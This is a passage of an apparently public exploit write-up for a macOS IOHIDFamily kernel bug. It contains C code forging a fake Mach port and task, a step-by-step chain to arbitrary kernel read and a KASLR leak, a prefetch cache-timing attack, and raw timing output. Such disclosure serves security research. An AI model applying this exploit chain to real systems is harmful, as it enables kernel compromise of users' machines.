&lt;span class=&quot;n&quot;&gt;ktask_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ktask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ktask_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shmem_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pagesize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;kport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80000002&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_references&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;kport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;kport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;receiver_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;kport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgcount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_QLIMIT_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;kport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qlimit&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_QLIMIT_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;kport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_kobject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shmem_kern&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pagesize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;kport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_srights&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;ktask&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ref_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The reference and right counts are just arbitrary numbers high enough to make sure no deallocation is attempted. The two &lt;code class=&quot;highlighter-rouge&quot;&gt;MACH_PORT_QLIMIT_KERNEL&lt;/code&gt; are there to prevent any accidental message being sent to the port (by simulating a full message queue), which would attempt to dereference the pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;ip_messages.klist.messages&lt;/code&gt;, which we don’t set. Anything else should be fairly straightforward. Now in order to read 4 bytes from an arbitrary kernel address, we merely need to set &lt;code class=&quot;highlighter-rouge&quot;&gt;bsd_info&lt;/code&gt; to the address we want minus &lt;code class=&quot;highlighter-rouge&quot;&gt;0x10&lt;/code&gt; bytes (because that’s the offset the &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; field has in &lt;code class=&quot;highlighter-rouge&quot;&gt;struct proc&lt;/code&gt;) and call &lt;code class=&quot;highlighter-rouge&quot;&gt;pid_for_task&lt;/code&gt; on it.&lt;/p&gt;
&lt;p&gt;At last, we’ve successfully turned very constrained read and write primitives into full arbitrary read. Now we just need something to read from - we’re after the kernel slide, which we still don’t know. We only know the addresses of our shared memory and of our kmsg hole. So it’d be nice if we could reuse the latter somehow to learn the slide. We already enumerated what structures we can allocate in such a place:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Data buffers.&lt;/li&gt;
&lt;li&gt;Pointer arrays.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;struct ipc_kmsg&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;In the beginning, the problem with pointer arrays was that they would only ever contain pointers to objects allocated on the heap, to where we couldn’t follow with our constrained read primitive. With arbitrary read however, things are looking much better! If we allocate, say, an &lt;code class=&quot;highlighter-rouge&quot;&gt;OSArray&lt;/code&gt;, read the pointer to the first object it contains, and from that address read the first 8 bytes, we get its vtable - which resides in &lt;code class=&quot;highlighter-rouge&quot;&gt;__CONST.__constdata&lt;/code&gt; and whose address thus reveals the kernel slide. Now we only have to allocate an &lt;code class=&quot;highlighter-rouge&quot;&gt;OSArray&lt;/code&gt; large enough for its pointer array to reach &lt;code class=&quot;highlighter-rouge&quot;&gt;0x30000&lt;/code&gt; bytes. One way of achieving this would be to actually allocate an array with 24’576 elements (we could use all &lt;code class=&quot;highlighter-rouge&quot;&gt;OSBoolean&lt;/code&gt;s to go easy on memory), but we don’t even have to. We can take advantage of the binary serialisation format, namely the fact that dictionaries, arrays and sets take a length specifier from userland. Effectively, we can set an &lt;code class=&quot;highlighter-rouge&quot;&gt;OSArray&lt;/code&gt;’s size to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x6000&lt;/code&gt; (that is later multiplied by the size of a pointer) but then supply only a single element (I’ll call this an “inflated array”). Even if we didn’t have all that though, we could ultimately also send a kmsg with an actual port to e.g. an &lt;code class=&quot;highlighter-rouge&quot;&gt;IOService&lt;/code&gt; object, which would also get us a C++ object pointer.&lt;/p&gt;
&lt;p&gt;So in review, we:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Spray the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;OSString&lt;/code&gt; buffers.&lt;/li&gt;
&lt;li&gt;Offset &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Read the strings back to find out where it landed.&lt;/li&gt;
&lt;li&gt;Punch a hole underneath it.&lt;/li&gt;
&lt;li&gt;Allocate a kmsg into that hole.&lt;/li&gt;
&lt;li&gt;Read &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_header&lt;/code&gt; off it, yielding the shmem kernel address.&lt;/li&gt;
&lt;li&gt;Repair any damage we’ve done.&lt;/li&gt;
&lt;li&gt;Allocate a new kmsg with body bytes corresponding to a port descriptor pointing to somewhere in shared memory.&lt;/li&gt;
&lt;li&gt;Flip &lt;code class=&quot;highlighter-rouge&quot;&gt;msgh_descriptor_count&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; so that our bytes are actually interpreted as a descriptor.&lt;/li&gt;
&lt;li&gt;Construct a fake port and task on the shared memory.&lt;/li&gt;
&lt;li&gt;Receive the kmsg, thus inserting the fake port into our namespace.&lt;/li&gt;
&lt;li&gt;Point &lt;code class=&quot;highlighter-rouge&quot;&gt;fakeport.ip_kobject.bsd_info&lt;/code&gt; to an address and use &lt;code class=&quot;highlighter-rouge&quot;&gt;pid_for_tak(fakeport)&lt;/code&gt; to read from it.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;At that point we could also attach a &lt;code class=&quot;highlighter-rouge&quot;&gt;vm_map_t&lt;/code&gt; (say, the &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel_map&lt;/code&gt;) to our fake task to gain full r/w, or swap the fake task out for a fake &lt;code class=&quot;highlighter-rouge&quot;&gt;IOService&lt;/code&gt; object with a custom vtable, allowing us to call arbitrary kernel code. I’m gonna leave it at leakage of the kernel slide here though.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This is implemented in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/leak/main.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/leak/main.c&lt;/code&gt;&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;leaking-the-kernel-slide-the-cheaters-way&quot;&gt;Leaking the kernel slide, the cheater’s way&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;Edit: The technique explained below has for some reason stopped working on macOS High Sierra 10.13.2. I don’t know why and I didn’t bother to investigate, but the IOHIDFamily vulnerability is still there all the same. So while the &lt;code class=&quot;highlighter-rouge&quot;&gt;hid&lt;/code&gt; binary in its current state will only work up to 10.13.1, you could just patch together &lt;code class=&quot;highlighter-rouge&quot;&gt;hid&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;leak&lt;/code&gt; to get everything working on 10.13.2 - or even write a mach-port-based exploit out of &lt;code class=&quot;highlighter-rouge&quot;&gt;leak&lt;/code&gt;, I hear mach ports are the real deal. :P&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The above is nice and all (and was actually super fun to piece together), but it has a slight drawback: scanning all these &lt;code class=&quot;highlighter-rouge&quot;&gt;OSString&lt;/code&gt;s to find out where &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; landed takes a significant amount of time to execute, and that is after getting the &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDUserClient&lt;/code&gt; port. In a real attack scenario, that would mean that if we run on a logout, the user would be confronted with a black screen for quite a bit longer than they’d expect and be comfortable with, and if we run on a shutdown/reboot, we might even get killed before we get our work done (this depends on physical memory size, and is also less likely when targeting the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt; but more likely with the &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel_map&lt;/code&gt;). On top of that, the above way to leak the slide was chronologically the last part of the exploit I wrote. For those reasons we’re gonna look at another way to leak the kernel slide, one that can be executed independently of any other part of the exploit: hardware vulnerabilities!&lt;/p&gt;
&lt;p&gt;Long story short, we’re doing a prefetch cache timing attack &lt;a href=&quot;https://gruss.cc/files/prefetch.pdf&quot;&gt;as devised by Gruss et al&lt;/a&gt;. I add nothing new to this technique, I merely wrote my own implementation. For those unfamiliar with how it works, the basic vulnerabilities lie in the x86 &lt;code class=&quot;highlighter-rouge&quot;&gt;prefetchtN&lt;/code&gt; instructions (where &lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt; can be &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt;, …). Those were designed as hints to the CPU that the program wants data at some address loaded into a particular cache, but they have a few interesting properties:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;They ignore access permissions of all kinds, allowing even the prefetching of kernel memory (we’re still not able to read that from the cache then though).&lt;/li&gt;
&lt;li&gt;They perform a number of address lookup attempts, and stop as soon as they find something. This means that for an unitialised (or evicted) cache, they execute significantly faster for mapped addresses than unmapped ones.&lt;/li&gt;
&lt;li&gt;They silently ignore all errors (not an actual vulnerability, but a nice property).&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Interestingly enough, no implementation I found on the web seemed to work for me, so I ended up writing my own. Like in the paper, I target the &lt;code class=&quot;highlighter-rouge&quot;&gt;prefetcht2&lt;/code&gt; instruction (i.e. the L2 cache), and for every timing I do:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Evict the cache.&lt;/li&gt;
&lt;li&gt;Use &lt;code class=&quot;highlighter-rouge&quot;&gt;mfence&lt;/code&gt; to synchronise memory accesses.&lt;/li&gt;
&lt;li&gt;Invoke &lt;code class=&quot;highlighter-rouge&quot;&gt;prefetcht2&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Use &lt;code class=&quot;highlighter-rouge&quot;&gt;rdtscp&lt;/code&gt; before and after it to get the time difference.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;For eviction I use the L3 cache rather than just the L2, because then misses will have to go to main memory, which leaves a much bigger mark in the time difference (there’s also a notable difference when evicting L2, it’s just a lot smaller). The most efficient way (I know of) to do that is to allocate a memory block as large as the L3 cache, divide it into parts as large as the cache line size, and do a single memory read on each of those parts. Conveniently, there are two &lt;code class=&quot;highlighter-rouge&quot;&gt;sysctl&lt;/code&gt; entries &lt;code class=&quot;highlighter-rouge&quot;&gt;hw.cachelinesize&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;hw.l3cachesize&lt;/code&gt; giving us exactly those sizes.&lt;/p&gt;
&lt;p&gt;Now in order to find the kernel base, we just start at address &lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffff8000000000&lt;/code&gt;, go up to &lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffff8020000000&lt;/code&gt; in steps of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x100000&lt;/code&gt; bytes, perform 16 timings at each step and throw in a &lt;code class=&quot;highlighter-rouge&quot;&gt;sched_yield()&lt;/code&gt; before each timing to minimise external interference. I implemented that in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/data/kaslr.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;data/kaslr.c&lt;/code&gt;&lt;/a&gt;, and running it yields the following:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;0xffffff8000000000     32    452     32     32     32     32     32     32     32     32    116     31     28     28     28     31
0xffffff8000100000    558    232    235    468    232    332    499    335    242    301    239    291    874    369    343    286
0xffffff8000200000    286    437    446    463    440    434    443    561    443    437    443    443    440    440    452    511
0xffffff8000300000    446    538    546    286    440    440    499    440    440    451    440    448    437    443    505    543
0xffffff8000400000    452    469    443    307    307    295    307    443    670    437    475    682    658    788    304    573
0xffffff8000500000    460    679    440   1116    452    440    496   1642    558    588    443    307    512    874    598    660
0xffffff8000600000    598    282    318    457    443    461    481    402    454    440    443    461    443    443   1078    605
0xffffff8000700000    602    647    602    605    591    576    451    715    310    529    310    269   1621    794    307    356
0xffffff8000800000    453    282    443    279    496    443    800    664    946    834   1107    555    440   1196    334    443
0xffffff8000900000    454    454    593    555    443    794    449    490    286    440    443    443    443    454    446    463
0xffffff8000a00000    520    440    561    593    496    552    384    590    588    588    578    608    614   1110    636    380
0xffffff8000b00000    448    572    280    596    568    600    444    444    712    448    528    456   1296    448    628    452
0xffffff8000c00000    448    456    584    448    596    452    448    780    276    310    310    443    450    453    456    543
0xffffff8000d00000    573    453    453    450    540    446    279    471    472    522    472    440    443    472    443    451
0xffffff8000e00000    461    440    475    310    464    579    464    469    482    454    464    440    614    452    310    472
0xffffff8000f00000    475    759    461    767    458    443    475    718    475   1514    443   1934    319    708    307   1258
0xffffff8001000000    443   1033    718    658    454    443    440    620    446   1048    552    741    443    443    454    440
0xffffff8001100000    440    502    463    446    520    446    443    443    443    443    443    529    529    457    637    437
0xffffff8001200000    372    278    286    443    443  42659    390    450    279    440    443    447    443    443    446    567
0xffffff8001300000    564    544    446    440    440    457    443    526    522    517    449    443    440    526    443    455
0xffffff8001400000    656    469    461    440    472    608   1178    446   1036    443    443    508    461    871    472    440
0xffffff8001500000    475   1317    437    555    511    451    472    458    593    440    440    472    546    620   1264   1724
0xffffff8001600000    543    523    711    638    528    437    440    758    555    455    263    369    301   1491    901   1557
0xffffff8001700000    568    263    553    272    458    266    280    277    676    464    815    570    437    455   1096    930
0xffffff8001800000    479    301    272    493    558   1361   1311    310   1470    452    290    396    109    280    263    277
0xffffff8001900000    478    295    602    771    354   1258    865    556     83    190    167    106    109     81    291    325
0xffffff8001a00000    679    650    791    626    313    266    266    263    266    266    263    274    277    277    277    283
0xffffff8001b00000    440    103    266    266    274    266    263    269    280    266    263    260    266    280    274    266
0xffffff8001c00000    443    266    304    277    139    290    759     92    106    269    109    277    106    280    263    106
0xffffff8001d00000    443    266    269    277    806    266    277    425    269    537    266    277    266    360    277    694
0xffffff8001e00000    440    263    280    269    266    269    293    266    266    266    277    283    266    277    283    263
0xffffff8001f00000    582    266    269    266    266    280    266    263    266    269    263    269    266    328    269    274
0xffffff8002000000    443    847    277    277    298    266    283    274    272    307    277    269    280    274    266    269
0xffffff8002100000    443    266    280    280    277    269    283    269    475    277    274    266    269    277    517    295
0xffffff8002200000    443    425    266    283    451    266    272    277    310    316    283    283    283    269    269    266
0xffffff8002300000    449    266    275    269    446    266    283    298    384    277    277    280    266    322    272    266
0xffffff8002400000    467    283    269    106     92    106    274    280    280    266    277    280    277    280    266    304
0xffffff8002500000    454    277    269    269    277    266    269    277    266    266    263    277    490    277    289    286
0xffffff8002600000    440    440    443    443    443    440    443    440    440    452    440    443    440   1116    443    454
0xffffff8002700000    948    440    443    599    443    451    280    446    451    454    454    440    464    283    520    514
0xffffff8002800000    440    443    437    440    476    729    443    443    437    431    422    457    266    432    275    679
0xffffff8002900000   1101    443    443    443    597    505    443    558    269    440    440    103    446    443    100   1175
0xffffff8002a00000    540   1063    564    319    800    266    558    741    505    505    502    451    443    558   1524    727
0xffffff8002b00000   1151    443    440    443    443    443    277    443    440    457    443    440    454    263    443    437
0xffffff8002c00000    446    280    508    272    508    511    567    519    602    508    546    440    440    443    440    454
0xffffff8002d00000    481   1010    744    537    440    440    514    443    534    511    673    537    523    263    520    543
0xffffff8002e00000    443    443    443    451    461    440    484    440    443    457    443    508    540    443    525    440
0xffffff8002f00000    446    440    449    440    460    449    443    443    440    266    443    440    443    263    443    697
0xffffff8003000000    440    449    446    443    443    522    443   1447    635   1237    452    440    437    440    443    458
0xffffff8003100000    443    446    460    440    443    457    446    440    443    440    443    440    440    454    443    443
0xffffff8003200000    443    457    452    440    446    443    446    454    454    446    443    446    443    461    440    443
0xffffff8003300000    454    446    446    449    443    469    289    440    460    443    440    664    446    443    446    475
0xffffff8003400000    437    443    437    443    443    437    443    443    443    440    449    581    446    443    446    443
0xffffff8003500000    443    440    437    448    443    443    443    461    440    452    440    443    440    457    443    443
0xffffff8003600000    440    269    277    283    266    280    280    269    269    481    280    266    263    269    266    269
0xffffff8003700000    451    280    269    280    269    283    272    266    277    280    269    280    277    266    269    310
0xffffff8003800000    443    266    280    266    266    266    269    277    277    269    266    269    283    266    269    269
0xffffff8003900000    532    266    266    277    283    272    266    269    266    277    915    277    269    272    277    278
0xffffff8003a00000    440    269    272    277    269    277    280    552    275    269    277    301    277    289    266    269
0xffffff8003b00000    452    283    277    269    269    301    280    272    269    269    280    269    280    266    280    266
0xffffff8003c00000    443    269    277    446    440    277    871    295    280    280    281    266    269    266    277    277
0xffffff8003d00000    582    277    269    277    269    266    269    280    280    266    269    280    269    269    263    266
0xffffff8003e00000    440    289    280    266    266    280    280    266    269    266    266    269    269    286    269    274
0xffffff8003f00000    443    272    269    277    277    266    280    269    266    269    266    277    277    269    283    266
0xffffff8004000000    443    812    269    280    266    266    263    266    266    266    266    266    298    263    272    277
0xffffff8004100000    446    266    263    266     95    277    263    266    263    277    266    263    284    472    266    263
0xffffff8004200000    440    269    266    106    269    269    269    280    277    280    266    277    269    372    280    277
0xffffff8004300000    443    269    269    269    266    269    280    355    275    272    266    277    272    301    266    269
0xffffff8004400000    463    266    263    277    277    277    608    275    269     92    266    280    277    266    277    278
0xffffff8004500000    440    266    266    266    266    266    277    263    304    266    266    266    266    263    277    266
0xffffff8004600000    446    280    266    274    266    269    266    280    272    588    266    266    263    280    277    266
0xffffff8004700000    821    266    280    277    277    277    266    269    274    266    266    269    277    591    327    266
0xffffff8004800000    448    269    706    272    269    272    277    280    266    407     95    266    576    266    269     92
0xffffff8004900000    590    266    269     92    266    277    266    443    269    434    467    289    269    266    266    269
0xffffff8004a00000    440    277    263    280    263    281    292    266    266    266    266    277    266    266    263    277
0xffffff8004b00000    461    266    263    266    277    596    310    274    277    357    266    552    263    472    266    266
0xffffff8004c00000    481    283    280    266    277    277    269    269    263    277    283    269    269    277    269    283
0xffffff8004d00000    457    280    266    277    614    266    393    277    277    280    428    277    280    266    272    280
0xffffff8004e00000    461    283    425    266    277    269    277    280    280    275    266    277    277    283    277    269
0xffffff8004f00000    443    277    269    277    280    266    269    266    281    277    280    280    266    269    106    269
0xffffff8005000000    517    266    272    280    290    280    263    277    280    266    266    269    277    443    277    280
0xffffff8005100000    446    280    266    266    280    269    263    266    280    277    295    277    269    277    266    304
0xffffff8005200000    443    277    277    283    266    269    277    269    277    272    269    280    283    275    277    277
0xffffff8005300000    464    287    269    269    280    106    295    266    266    266    283    266    277    277    269    269
0xffffff8005400000    511    272    277     95    266    269    266    269    280    263    277    269    280    277    277    298
0xffffff8005500000    457    449    446    543    546    546    543    629    543    543    543    449    466    446    443    451
0xffffff8005600000    446    457    443    526    460    443    443    443    528    449    446    443    443    443    443    469
0xffffff8005700000    454    446    443    443    446    443    466    440    449    443    446    440    519    511    446    522
0xffffff8005800000    443    440    452    446    451    443    443    443    440    443    472    443    443    454    475    454
0xffffff8005900000    440    461    446    440    440    434    446    440    464    446    443    443    443    446    443    443
0xffffff8005a00000    534    460    446    446    457    446    443    443    443    454    499    446    446    440    443    443
0xffffff8005b00000    460    454    440    446    517    457    443    446    443    457    457    443    443    499    440    449
0xffffff8005c00000    440    440    443    454    446    443    454    738    440    440    437    443    454    440    440    443
0xffffff8005d00000    440    457    378    437    520    856    523    523    443    443    443    454    476    440    475    446
0xffffff8005e00000    440    280    266    266    103    295    269    283    266    277    280    269    292    322    266    277
0xffffff8005f00000    626    266    343    272    269    287    284    269    280    280    295    269    263    266    266    269
0xffffff8006000000    454    904    443    266     92    103    277    304    266    266    266    266    280    280    266    280
0xffffff8006100000    440    266    443    273    313    269    279    106    276    282    418    112    266    106    263    273
0xffffff8006200000    446    276    276    269    273    273    269    269    273    273    266    266    328    103    280    266
0xffffff8006300000    587    266    266    266    336    263    266    331    266    266    109     99    102    276    266    266
0xffffff8006400000    446    440    269    280    280    269    558    269    266    266    269    277    467    104    269    272
0xffffff8006500000    443    263    277    363    277    280    277    342    274    263    269    280    277    263    277    328
0xffffff8006600000    446    443    443    451    440    443    443    451    440    455    440    446    440    440    440    440
0xffffff8006700000    443    440    443    440    277    691    448    277    440    667    561    912    443    451    451    440
0xffffff8006800000    540    440    440    446    451    443    277    434    443    443    467    484    440    451    785    434
0xffffff8006900000    437    528    540    570    529    526    543    440    266    440    448    440    434    443    437    443
0xffffff8006a00000    451    451    443    443    437    440    454    440    458    443    440    596    461    440    448    443
0xffffff8006b00000    440    599    263    457    632    443    443    443    269    446    632    443    440    451    443    475
0xffffff8006c00000    440    499    451    440    443    440    443    440    437    448    454    564    478    481    464    487
0xffffff8006d00000    443    454    499    434    437    272    440    667    454   1060    472    443    487    437    437    451
0xffffff8006e00000    440    446    647    440    437    443    454    269    440    304    440    446    440    440    437    437
0xffffff8006f00000    446    440    437    272    443    451    499    771    440    443    440    440    440    440    452    454
0xffffff8007000000    437    440    540    452    434    448    440    440    437    437    493    434    437    434    437    440
0xffffff8007100000    440    437    443    437    434    266    437    277    437    263    437    437    434    585    451    437
0xffffff8007200000    443    446    440    443    443    437    440    266    481    570    451    440    440    440    443    440
0xffffff8007300000    451    454    440    440    437    440    451    443    443    451    454    437    440    437    440    449
0xffffff8007400000    437    434    665    440    266    437    451    443    443    579    440    469    434    437    437    437
0xffffff8007500000    437    567    263    437    446    434    437    437    437    437    434    567    440    434    437    499
0xffffff8007600000    818    266    437    437    260    277    266    266    263    286    263    446    263    263    263    260
0xffffff8007700000    443    263    274    274    260    263    277    274    263    263    263    263    469    266    260    263
0xffffff8007800000    440    263    263    263    263    434    266    451    266    277    274    266    266    283    274    277
0xffffff8007900000    451    277    277    293    263    277    266    274    280    277    277    260    266    269    266    280
0xffffff8007a00000    437    260    260    260    266    266    266    263    266    277    310    263    260    260    263    274
0xffffff8007b00000    455    274    263    277    280    269    298    266    266    263    263    269    322    266    723    263
0xffffff8007c00000    443    266    333    269    277    266    274    301    316    277    263    269    106    263    269    277
0xffffff8007d00000    587    266    269    440    443    266    277    269    440    280    313    546    437    263   1355    450
0xffffff8007e00000    437    266    446    447    276    273    502    717    587    478    481    313    446    283    585    283
0xffffff8007f00000    499    520    499    437    451    266    266    277    266    419    266    449   1211    472    535    142
0xffffff8008000000    454    263    263    552    336    482    295    269    331    272    292    281    280    340    277    629
0xffffff8008100000    440    587    280    269    266    269    266    269    266    266    280    280    280    269    269    280
0xffffff8008200000    440    283    266    277    266    277    499    283    269    266    266    280    269    280    266    269
0xffffff8008300000    466    277    266    266    274    266    313    266    266    263    269    280    286    277    434    266
0xffffff8008400000    443    269    269    266    440    440    263    266    815    372    280    266    277    458    277    266
0xffffff8008500000    939    263    269    280    277    266    274    313    277    522    103    274    263    274    452    266
0xffffff8008600000    620    277    278    266    280    295    266    277    266    269    277    266    452    690    461    109
0xffffff8008700000    457    269    269    280    277    307    280    266    269    280    277    266    266    570    496    293
0xffffff8008800000    280    266    277    266    450    105    276    276    434    276    273    269    273    279    269    524
0xffffff8008900000   1116    349    266    281    266    266    295    277    266    280    269    266    277    266    266    274
0xffffff8008a00000    451    280    266    280    280    266    266    283    277    277    266    269    277    277    280    266
0xffffff8008b00000    437    266    269    280    266    266    280    266    269    266    266    263    272    266    277    269
0xffffff8008c00000    443    617    263    266    277    266    269    263    277    280    614    419    824    280    493    390
0xffffff8008d00000   1355    484    475    432     81    269    351    357    428    269    292    387    579    454    266    269
0xffffff8008e00000    564    272    266    322    363    313    266    269    269    269    269    269    266    440    266    280
0xffffff8008f00000    443    277    266    277    277    274    280    280    277    277    269    280    280    280    612    556
0xffffff8009000000 293052    704   1466    635    607    109    322    279    266    285    276    276    276    558    276    279
0xffffff8009100000    461    295    280    269    277    266    263    266    277    408    298    295    277    269    266    280
0xffffff8009200000    440    269    269    936    346    280    269    269    283    266    277    263    272    280    266    266
0xffffff8009300000    443    280    266    266    269    269    269    266    401    269    266    266    283    277    266    266
0xffffff8009400000    543     92    103    396    800    277    263    266    263    263    277    612    449    280    468    865
0xffffff8009500000    592    266    456    446    109    530    276    539    440    440    130    834    450    443    440    448
0xffffff8009600000    443    440    443    440    437    517    558    280    520    520    440    437    552    567    450    514
0xffffff8009700000    275    564    280    765    443    283    443    670   1497    829   1022    443    443    449   1039    794
0xffffff8009800000    460    443   1092    446   1405    446    688    443    774    446   1302    466    443    451    632    529
0xffffff8009900000    463    443    443    443    440    443    440    440    440    437    452    443    443    443    443    443
